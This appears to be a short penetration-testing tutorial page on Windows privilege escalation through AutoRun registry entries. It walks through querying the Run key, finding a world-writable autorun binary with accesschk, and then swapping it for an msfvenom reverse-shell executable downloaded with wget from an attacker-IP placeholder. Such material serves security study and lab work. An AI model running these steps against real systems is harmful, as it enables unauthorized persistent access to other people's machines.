# AutoRuns

Windows can be set to run scripts and applications on system boot and on logon of a user.

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

![](<../../../../.gitbook/assets/image (15) (2).png>)

Above, the binary `program.exe` has been located under the specified registry path. Binaries found in this path are executed every time a user logs into the system. [<mark style="color:red;">\[Source\]</mark>](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)

Running `accesschk.exe` against the binary shows that the security group "Everyone" has _FILE\_ALL\_ACCESS_ permission to the binary.

```
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

![](<../../../../.gitbook/assets/image (118) (2).png>)

This means the binary can be overwritten by anyone. In this effect, replacing the binary with a reverse shell of the name `program.exe` would mean the next time someone logs in it would be possible to have the shell executed in the context of the logged in user.

```
# Create Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o program.exe

# Upload to target system
wget http://<Attacker-IP>/program.exe

# Move to binary folder
move .\program.exe "C:\Program Files\Autorun Program\" /Y

# Wait for user to login
```
